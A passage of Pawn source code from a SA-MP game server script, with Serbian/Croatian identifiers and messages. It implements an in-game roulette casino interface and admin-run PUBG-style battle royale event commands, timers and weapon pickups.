        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][91], 390.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][91], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][91], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][91], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][91], 101322751);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][91], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][91], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][91], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][91], 1);

        RouletteTD[playerid][92] = CreatePlayerTextDraw(playerid, 401.666595, 264.666625, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][92], 0.000000, 2.583334);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][92], 447.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][92], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][92], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][92], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][92], 101322751);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][92], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][92], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][92], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][92], 1);

        RouletteTD[playerid][93] = CreatePlayerTextDraw(playerid, 461.666625, 264.903564, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][93], 0.000000, 2.583334);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][93], 510.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][93], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][93], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][93], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][93], 101322751);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][93], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][93], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][93], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][93], 1);

        RouletteTD[playerid][94] = CreatePlayerTextDraw(playerid, 311.249877, 268.296234, "1st12");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][94], 0.292083, 1.719258);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][94], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][94], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][94], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][94], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][94], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][94], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][94], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][94], true);

        RouletteTD[playerid][95] = CreatePlayerTextDraw(playerid, 365.833190, 268.296234, "2nd12");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][95], 0.292083, 1.719258);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][95], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][95], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][95], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][95], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][95], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][95], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][95], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][95], true);

        RouletteTD[playerid][96] = CreatePlayerTextDraw(playerid, 422.499908, 267.777709, "3rd12");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][96], 0.292083, 1.719258);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][96], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][96], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][96], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][96], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][96], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][96], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][96], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][96], true);

        RouletteTD[playerid][97] = CreatePlayerTextDraw(playerid, 485.416503, 267.777709, "1-18");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][97], 0.292083, 1.719258);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][97], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][97], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][97], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][97], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][97], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][97], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][97], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][97], true);

        RouletteTD[playerid][98] = CreatePlayerTextDraw(playerid, 291.249938, 302.237060, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][98], 0.000000, 2.583334);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][98], 334.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][98], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][98], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][98], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][98], 101322751);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][98], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][98], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][98], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][98], 1);

        RouletteTD[playerid][99] = CreatePlayerTextDraw(playerid, 311.666534, 305.111022, "19-36");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][99], 0.292083, 1.719258);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][99], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][99], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][99], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][99], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][99], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][99], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][99], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][99], true);

        PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : Nista");
        PlayerTextDrawSetString(playerid, RouletteTD[playerid][81], "Trenutni Ulog : 100$");
        PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], "Moguci Dobitak : Nema");

        for(new i = 0; i < 100; i++) {

            PlayerTextDrawShow(playerid, RouletteTD[playerid][i]);
        }

        RouletteUlog[playerid] = 100;
        RouletteOdabir[playerid] = 0;
        RouletteIgra[playerid] = true;

        SelectTextDraw(playerid, SRVBOJA1);

        return 1;
    }
    else {

        for(new i = 0; i < 100; i++) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][i]);
            PlayerTextDrawDestroy(playerid, RouletteTD[playerid][i]);
            RouletteTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
        }

        RouletteUlog[playerid] = 0;
        RouletteOdabir[playerid] = 0;
        RouletteIgra[playerid] = false;

        CancelSelectTextDraw(playerid);
    }

    return 1;
}

clickedRouletteNumber(playerid, PlayerText:playertextid) {

    for(new i = 43; i < 79; i++) {

        if(playertextid == RouletteTD[playerid][i]) return true;
    }
    return false;
}

rouletteBroj(playerid, PlayerText:playertextid) {

    for(new i = 43; i < 79; i++) {

        if(playertextid == RouletteTD[playerid][i]) {

            RouletteOdabir[playerid] = i - 42;
            Roulette_PromeniOdabir(playerid);
            IzracunajDobitak(playerid);
        }
    }
}

Roulette_PromeniOdabir(playerid) {

    if(RouletteOdabir[playerid] != 0) {

        if(RouletteOdabir[playerid] <= 36) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            new string[64];
            new check = RouletteOdabir[playerid] % 2;
            if(check == 0)
                format(string, sizeof(string), "Odabrano : ~r~%d", RouletteOdabir[playerid]);
            else if(check == 1)
                format(string, sizeof(string), "Odabrano : ~l~%d", RouletteOdabir[playerid]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);

            return 1;
        }
        else if(RouletteOdabir[playerid] == 38) {
            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~l~Crna");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 37) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~r~Crvena");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 39) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~Zelena");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 40) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~1st 12");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 41) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~2nd 12");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 42) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~3rd 12");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 43) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~1-18");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 44) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][82]);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][82], "Odabrano : ~g~19-36");
            PlayerTextDrawShow(playerid, RouletteTD[playerid][82]);
            return 1;
        }
    }

    return 1;
}

IzracunajDobitak(playerid) {

    if(RouletteOdabir[playerid] != 0) {

        if(RouletteOdabir[playerid] <= 36) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][88]);
            new string[64];
            new dobitak = RouletteUlog[playerid] * 10;
            format(string, sizeof(string), "Moguci Dobitak : ~g~%d$", dobitak);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][88]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 37 || RouletteOdabir[playerid] == 38) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][88]);
            new string[64];
            new dobitak = RouletteUlog[playerid] * 2;
            format(string, sizeof(string), "Moguci Dobitak : ~g~%d$", dobitak);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][88]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 39) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][88]);
            new string[64];
            new dobitak = RouletteUlog[playerid] * 10;
            format(string, sizeof(string), "Moguci Dobitak : ~g~%d$", dobitak);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][88]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 40 || RouletteOdabir[playerid] == 41 || RouletteOdabir[playerid] == 42) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][88]);
            new string[64];
            new dobitak = RouletteUlog[playerid] * 2;
            format(string, sizeof(string), "Moguci Dobitak : ~g~%d$", dobitak);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][88]);
            return 1;
        }
        else if(RouletteOdabir[playerid] == 43 || RouletteOdabir[playerid] == 44) {

            PlayerTextDrawHide(playerid, RouletteTD[playerid][88]);
            new string[64];
            new dobitak = RouletteUlog[playerid] * 2;
            format(string, sizeof(string), "Moguci Dobitak : ~g~%d$", dobitak);
            PlayerTextDrawSetString(playerid, RouletteTD[playerid][88], string);
            PlayerTextDrawShow(playerid, RouletteTD[playerid][88]);
            return 1;
        }
    }

    return 1;
}

timer vrteoSkoroTimer[1000](playerid) {

    if(vrteoSkoro[playerid] > 0) {
        vrteoSkoro[playerid]--;
        defer vrteoSkoroTimer(playerid);
    }
    

    return 1;
}

ZavrtiRulet(playerid) {

    if(vrteoSkoro[playerid]) return SendErrorMessage(playerid, "Pricekaj %d sekundi pre ponovnog vrtenja!", vrteoSkoro[playerid]);
    if(RouletteOdabir[playerid] == 0) return SendErrorMessage(playerid, "Nisi odabrao nista!");
    if(GetPlayerMoney(playerid) < RouletteUlog[playerid]) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

    vrteoSkoro[playerid] = 5;
    defer vrteoSkoroTimer(playerid);

    DajIgracuNovac(playerid, -RouletteUlog[playerid]);

    new izvucenBroj = RandomNew(1, 37);
    new check = izvucenBroj % 2;

    new sansa = RandomNew(1, 200);
    if(sansa == 5) {

        izvucenBroj = 37;
    }

    PlayerTextDrawHide(playerid, RouletteTD[playerid][80]);
    new string[5];

    if(izvucenBroj != 37)
        format(string, sizeof(string), "%d", izvucenBroj);
    else 
        format(string, sizeof(string), "0");
    PlayerTextDrawSetString(playerid, RouletteTD[playerid][80], string);
    PlayerTextDrawShow(playerid, RouletteTD[playerid][80]);

    PlayerTextDrawHide(playerid, RouletteTD[playerid][79]);

    if(check == 0 && izvucenBroj != 37) //crvena
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][79], 0xCC0000FF);
    else if(check == 1 && izvucenBroj != 37) //crna
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][79], 0x191919FF);

    if(izvucenBroj == 37) 
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][79], 0x649943FF);

    PlayerTextDrawShow(playerid, RouletteTD[playerid][79]);

    Roulette_CheckPrice(playerid, izvucenBroj);

    return 1;
}

Roulette_CheckPrice(playerid, izvucenBroj) {

    if(RouletteOdabir[playerid] <= 36) {

        if(RouletteOdabir[playerid] == izvucenBroj) { //dobio

            new dobitak = RouletteUlog[playerid] * 10;
            DajIgracuNovac(playerid, dobitak);
            va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
            LogSave( "Ostalo/LogRoulette.log", string );

            return 1;
        }
        return 1;
    }
    else if(RouletteOdabir[playerid] == 37 || RouletteOdabir[playerid] == 38) {

        new izvuceno = izvucenBroj % 2;
        new odabrano = RouletteOdabir[playerid] % 2;

        if(izvuceno != odabrano) {

            new dobitak = RouletteUlog[playerid] * 2;
            DajIgracuNovac(playerid, dobitak);
            va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
            LogSave( "Ostalo/LogRoulette.log", string );

            return 1;
        }

        return 1;
    }
    else if(RouletteOdabir[playerid] == 39) {

        new izvuceno = izvucenBroj + 2;

        if(RouletteOdabir[playerid] == izvuceno) {

            new dobitak = RouletteUlog[playerid] * 10;
            DajIgracuNovac(playerid, dobitak);
            va_GameTextForPlayer(playerid, "VELIKI DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

            new string[ 128 ]; 
            format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
            LogSave( "Ostalo/LogRoulette.log", string );

            return 1;
        }

        return 1;
    }
    else if(RouletteOdabir[playerid] == 40 && izvucenBroj >= 1 && izvucenBroj <= 12) {

        new dobitak = RouletteUlog[playerid] * 2;
        DajIgracuNovac(playerid, dobitak);
        va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

        new string[ 128 ]; 
        format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
        LogSave( "Ostalo/LogRoulette.log", string );

        return 1;
    }
    else if(RouletteOdabir[playerid] == 41 && izvucenBroj >= 13 && izvucenBroj <= 24) {

        new dobitak = RouletteUlog[playerid] * 2;
        DajIgracuNovac(playerid, dobitak);
        va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

        new string[ 128 ]; 
        format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
        LogSave( "Ostalo/LogRoulette.log", string );

        return 1;
    }
    else if(RouletteOdabir[playerid] == 42 && izvucenBroj >= 25 && izvucenBroj <= 36) {

        new dobitak = RouletteUlog[playerid] * 2;
        DajIgracuNovac(playerid, dobitak);
        va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

        new string[ 128 ]; 
        format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
        LogSave( "Ostalo/LogRoulette.log", string );

        return 1;
    }
    else if(RouletteOdabir[playerid] == 43 && izvucenBroj >= 1 && izvucenBroj <= 18) {

        new dobitak = RouletteUlog[playerid] * 2;
        DajIgracuNovac(playerid, dobitak);
        va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

        new string[ 128 ]; 
        format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
        LogSave( "Ostalo/LogRoulette.log", string );

        return 1;
    }
    else if(RouletteOdabir[playerid] == 44 && izvucenBroj >= 19 && izvucenBroj <= 36) {

        new dobitak = RouletteUlog[playerid] * 2;
        DajIgracuNovac(playerid, dobitak);
        va_GameTextForPlayer(playerid, "DOBITAK!! ~g~+ %d$", 3000, 1, dobitak);

        new string[ 128 ]; 
        format( string, sizeof( string ), "Igrac %s je dobio %d$ na ruletu", ImeIgraca( playerid ), dobitak );
        LogSave( "Ostalo/LogRoulette.log", string );

        return 1;
    }

    return 1;
}

CMD:roulette(playerid) {

    for( new i = 1; i < MAX_BUSSINES; i++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 80.0, BussinesInfo[ i ][ bExitX ], BussinesInfo[ i ][ bExitY ], BussinesInfo[ i ][ bExitZ ] ) && GetPlayerVirtualWorld( playerid ) == BussinesInfo[ i ][ bInVW ]) {
            if(BussinesInfo[ i ][ bType ] == VRSTA_CASINO) {
                
                if(RouletteIgra[playerid]) 
                    RouletteTDControl(playerid, false);
                else 
                    RouletteTDControl(playerid, true);
                break;
            }
        }
    }
    return 1;
}

canPlayerTeleport(playerid) {

    if(KoristiKran[playerid]) return false;
    if(IsValidDynamicObject(PlayerCaseOBJ[209][playerid])&&PlayerCaseX[playerid] != 0) return false;

    return true;
}

////////////////////////////////


CMD:pokrenipubg(playerid) {

    if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
    if( !AdminDuty[ playerid ] ) return HungerMessage( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
    if(PubgPokrenut) return PubgGreska(playerid, "Pubg je vec pokrenut!");

    PubgPokrenut = true;
    PubgPocelo = false;
    PubgIgraci = 0;
    PubgZonaCount = 0;
    pubgStartCount = 0;

    PubgMessageAll("Pubg je pokrenut od strane admina! Da udjes koristi /joinpubg");

    return 1;
}

CMD:joinpubg(playerid) {

    if(!PubgPokrenut) return PubgGreska(playerid, "Pubg nije pokrenut!");
    if(PubgPocelo) return PubgGreska(playerid, "Igra je vec pocela!");
    if(PubgIgra[playerid]) return PubgGreska(playerid, "Vec si u pubg-u!");
    if(PubgIgraci == 20) return PubgGreska(playerid, "Broj mesta je popunjen!");

    if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Game Helper?" );
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
    if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
    if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
    if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
    if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");

    PubgIgra[playerid] = true;
    PubgIgraci++;
    PubgMessage(playerid, "Uspesno si usao u Pubg! Sacekaj da igra pocne! Da napusti PUBG koristi /napustipubg");
    PubgMessageAll("Igrac %s je usao u Pubg Lobby! Trenutno igraca : %d", ImeIgraca(playerid), PubgIgraci);
    return 1;
}

CMD:napustipubg(playerid) {

    if(!PubgIgra[playerid]) return PubgGreska(playerid, "Ne igras PUBG!");

    stopPubgPlayer(playerid);

    if(PubgIgraci == 1) {

        new pobednik;
        foreach(Player, i) {

            if(PubgIgra[i]) pobednik = i;
        }

        PubgMessageAll("Pobednik PUBG Eventa je %s! Nagrada : %d", ImeIgraca(pobednik), PubgNagrada);
        GivePlayerMoney(pobednik, PubgNagrada);
        stopPubgPlayer(pobednik);
        stopPubg();
    }
    else {

        PubgMessageAll("Igrac %s je napustio PUBG! Preostalo Igraca : %d", ImeIgraca(playerid), PubgIgraci);
    }

    return 1;
}

CMD:pubgcount(playerid) {

    if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
    if( !AdminDuty[ playerid ] ) return HungerMessage( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
    if(PubgPocelo) return PubgGreska(playerid, "Pubg se vec igra!");

    if(PubgIgraci < 2) return PubgGreska(playerid, "Ne mozes poceti igru sa manje od 2 igraca!");

    PubgPocelo = true;
    pubgStartCount = 10;

    defer pubgStartCountdown();

    foreach(Player, i) {

        if(PubgIgra[i]) {

            PubgMessage(i, "Igra pocinje za 10 sekundi!");
        }
    }
    return 1;
}

CMD:zaustavipubg(playerid) {

    if(!isClanAdministracije(playerid)) return HungerMessage(playerid, "Samo admini i helperi!");
    if( !AdminDuty[ playerid ] ) return HungerMessage( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
    return stopPubg();
}

//--------------------- < Functions > ----------------------//

stopPubgPlayer(playerid) {

    PubgIgraci--;
    PubgSkace[playerid] = false;
    PubgIgra[playerid] = false;

    SetPlayerVirtualWorld(playerid, 0);

    Novi_SetSpawnInfo( playerid );
    SpawnPlayer( playerid );

    SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000 );

    return 1;
}

stopPubg() {

    destroyPubgPickups();

    if(IsValidDynamicObject(PubgAvionObjekat))
        DestroyDynamicObject(PubgAvionObjekat);

    if(IsValidDynamicObject(cameraObj))
        DestroyDynamicObject(cameraObj);

    PubgPokrenut = false;
    PubgPocelo = false;
    PubgIgraci = 0;
    PubgZonaCount = 0;
    pubgStartCount = 0;

    foreach(Player, i) {

        if(PubgSkace[i] || PubgIgra[i]) {

            stopPubgPlayer(i);
        }
    }

    GangZoneHideForAll(PubgZona);
    GangZoneDestroy(PubgZona);

    PubgMessageAll("Pubg je zaustavljen od strane admina!");

    return 1;
}

createPubgPickups() {

    for(new i = 0; i < MAX_PUBGWEAPONS; i++) {

        new posX = RandomNew(878, 1850) * (-1);
        new posY = RandomNew(1744, 2845);

        new Float:posZ;
        MapAndreas_FindZ_For2DCoord(posX, posY, posZ);

        pubgPickup[i] = CreateDynamicPickup(2035, 1, posX, posY, posZ+1, PubgVirtualWorld, -1, -1, 80.0, -1, 0);
    }
}

destroyPubgPickups() {

    for(new i = 0; i < MAX_PUBGWEAPONS; i++) {

        if(IsValidDynamicPickup(pubgPickup[i]))
            DestroyDynamicPickup(pubgPickup[i]);
    }

    return 1;
}

giveRandomPubgWeapon(playerid) {

    new br = RandomNew(1, 9);
    
    switch(br) {
        case 1: { GiveWeaponToPlayer(playerid, 16, 3); PubgMessage(playerid, "Pokupio si bombu!"); }
        case 2: { GiveWeaponToPlayer(playerid, 24, 15); PubgMessage(playerid, "Pokupio si Deagle!"); }
        case 3: { GiveWeaponToPlayer(playerid, 29, 30); PubgMessage(playerid, "Pokupio si MP5!"); }
        case 4: { GiveWeaponToPlayer(playerid, 30, 30); PubgMessage(playerid, "Pokupio si AK-47!"); }
        case 5: { GiveWeaponToPlayer(playerid, 31, 30); PubgMessage(playerid, "Pokupio si M4!"); }
        case 6: { GiveWeaponToPlayer(playerid, 34, 10); PubgMessage(playerid, "Pokupio si Sniper!"); }
        case 7: { DodajIgracuHP( playerid, 25 ); PubgMessage(playerid, "Pokupio si +25 HP-a!"); }
        case 8: { DodajIgracuArmour( playerid, 25 ); PubgMessage(playerid, "Pokupio si +25 pancira!"); }
    }

    return 1;
}

//--------------------- < Timers > ----------------------//

timer maliSkokTimer[3000](i) {

    PubgSkace[i] = true;

    return 1;
}

timer suzavanjeZone[60000]() {

    GangZoneDestroy(PubgZona);

    if(PubgZonaCount == 0) { PubgZona = GangZoneCreate(-1707, 1896, -1029, 2717); } 
    else if(PubgZonaCount == 1) { PubgZona = GangZoneCreate(-1569, 2063, -1156, 2567); } 
    else if(PubgZonaCount == 2) { PubgZona = GangZoneCreate(-1490, 2256, -1345, 2421); } 

    foreach(Player, i) {

        if(PubgIgra[i]) {

            PubgMessage(i, "Zona se suzava za 20 sekundi! Udji u crvenu zonu!");
            GangZoneShowForPlayer(i, PubgZona, 0xFF000066);
        }
    }

    PubgZonaCount++;

    defer suziZonuFinal();

    return 1;
}

timer suziZonuFinal[20000]() {

    foreach(Player, i) {

        if(PubgIgra[i]) {

            if(PubgZonaCount == 1) { SetPlayerWorldBounds(i, -1029, -1707, 2717, 1896); } 
            else if(PubgZonaCount == 2) { SetPlayerWorldBounds(i, -1156, -1569, 2567, 20638); } 
            else if(PubgZonaCount == 3) { SetPlayerWorldBounds(i, -1345, -1490, 2421, 2256); } 
        }
    }

    if(PubgZonaCount == 3) return 0;

    defer suzavanjeZone();

    return 1;
}

timer pubgStartCountdown[1000]() {

    if(pubgStartCount != 0) {

        pubgStartCount--;
        foreach(Player, i) {

            if(PubgIgra[i]) {

                va_GameTextForPlayer(i, "Pubg pocinje za : %d sekundi", 1000, 4, pubgStartCount);
            }
        }
        defer pubgStartCountdown();

        return 1;
    }
    else {

        createPubgPickups();

        defer suzavanjeZone();

        if(IsValidDynamicObject(PubgAvionObjekat))
            DestroyDynamicObject(PubgAvionObjekat);

        if(IsValidDynamicObject(cameraObj))
            DestroyDynamicObject(cameraObj);

        PubgAvionObjekat = CreateDynamicObject(1683, -854.38849, 1741.63550, 252.45518,   0.00000, 0.00000, 136.83061);
        MoveDynamicObject(PubgAvionObjekat, -1858.71680, 2715.13257, 252.45518, 35.0,  0.00000, 0.00000, 136.83061);

        cameraObj = CreateDynamicObject(19300, -854.67407, 1710.75989, 250.48515,   0.00000, 0.00000, 0.00000);
        MoveDynamicObject(cameraObj, -1851.84753, 2673.32544, 250.00481, 35.0,  0.00000, 0.00000, 0.00000);

        defer maliTimerPubg();

        foreach(Player, i) {

            if(PubgIgra[i]) {

                Novi_SetPlayerPos(i, -870.1888,1756.0559,88.2548);
            }
        }

    }

    return 1;
}

timer maliTimerPubg[1000]() {

    foreach(Player, i) {

        if(PubgIgra[i]) {

            AttachCameraToDynamicObject(i, cameraObj);

            defer maliSkokTimer(i);

            PubgMessage(i, "Pubg je poceo! Koristi tipku 'SPACE' da skocis!");
        }
    }

    return 1;
}

public OnPlayerAirbreak(playerid) {

    if(IgracLeti{playerid}) return 0;
